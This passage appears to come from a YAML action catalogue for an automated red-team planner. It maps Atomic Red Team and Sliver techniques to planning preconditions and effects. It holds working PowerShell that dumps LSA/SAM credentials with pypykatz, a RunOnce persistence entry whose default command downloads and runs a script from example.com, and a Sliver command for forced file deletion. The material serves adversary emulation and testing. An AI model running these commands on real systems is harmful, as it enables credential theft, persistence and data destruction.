      - (sliver-session ?executorID - executor ?target - host)
    effects:
      - (powershell ?s2 - executor ?target - host)
      - operator: When
        params:
          condition: (elevated-executor ?executorID - executor)
          effect: (elevated-executor ?s2 - executor)
  - uuid: art-t1003_002-pypykatz-live-lsa
    name: Registry parse with pypykatz
    id:
      - T1003.002
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: Security Account Manager'
    description: |
      `pypykatz live lsa` reads live LSA / SAM state and prints hashes and
      cached secrets to stdout. Method 3 folds the heavy prereq chain
      (install Python, create venv, pip install pypykatz) — this fold is
      expensive on first run; realistic simulation envs would pre-provision
      Python. ART auto_generated_guid a96872b2-cbf3-46cf-8eb4-27e8c0e85263.
    execution:
      executor: Powershell Executor
      command: |
        $venv = "#{venv_path}"
        if (-not (Test-Path "$venv\Scripts\pypykatz.exe")) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          if (-not (Get-Command py -ErrorAction Ignore)) {
            $pySetup = "$env:TEMP\python_setup.exe"
            Invoke-WebRequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -OutFile $pySetup
            Start-Process $pySetup -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
          }
          py -m venv $venv
          & "$venv\Scripts\pip.exe" install --no-cache-dir pypykatz | Out-Null
        }
        & "$venv\Scripts\pypykatz.exe" live lsa
    arguments:
      executor:
        description: The Powershell session ID used to invoke pypykatz.
        required: true
        pddl_index: executor1_var_in_plan
      venv_path:
        default: C:\Users\Public\venv_pypykatz
        description: Target-side path to a Python venv containing pypykatz.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1547_001-powershell-runonce
    name: PowerShell Registry RunOnce
    id:
      - T1547.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
    description: |
      Sets `NextRun` under a Run/RunOnce registry path via PowerShell's
      `Set-ItemProperty`. Payload runs at next system boot. Demonstrates
      the PowerShell variant of the classic Run-key persistence pattern.
      ART auto_generated_guid eb44f842-0457-4ddc-9b92-c4caa144ac42.
    execution:
      executor: Powershell Executor
      command: |
        Set-ItemProperty "#{reg_key_path}" "NextRun" '#{command_to_execute}'
    arguments:
      executor:
        description: The Powershell session ID used to invoke Set-ItemProperty.
        required: true
        pddl_index: executor1_var_in_plan
      reg_key_path:
        default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
        description: Registry path for the RunOnce entry.
        required: true
      command_to_execute:
        default: powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1')
        description: Command line invoked at next system boot.
        required: true
        pddl_index: string3_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (command-execution-at-startup ?c - string ?target - host)
  - uuid: sliver-rm
    name: Remove Remote Path
    id:
      - T1070.004
      - T1485
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Defense Evasion
      - Impact
    technique:
      - |
        Indicator Removal: File Deletion
      - Data Destruction
    description: The `rm(remote_path, recursive=False, force=False)` command removes
      a directory or file(s) from the remote system. Parameters include remote_path
      (remote path), recursive (recursively remove file(s)), and force (forcefully
      remove the file(s)).
    execution:
      executor: Sliver Executor
      command: |
        rm(session_id=#{executor}, remote_path=#{RemotePath}, recursive=#{Recursive}, force=#{Force})
    arguments:
      executor:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor0_var_in_plan
      RemotePath:
        description: Remote path
        required: true
        pddl_index: string1_var_in_plan
      Recursive:
        description: Recursively remove file(s)
        required: true
      Force:
        description: Forcefully remove the file(s)
        required: true
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
          - (os-macos ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
      - (file-exists ?path - string ?f - file ?target - host)
    effects:
      - (file-deleted ?f - file ?target - host)
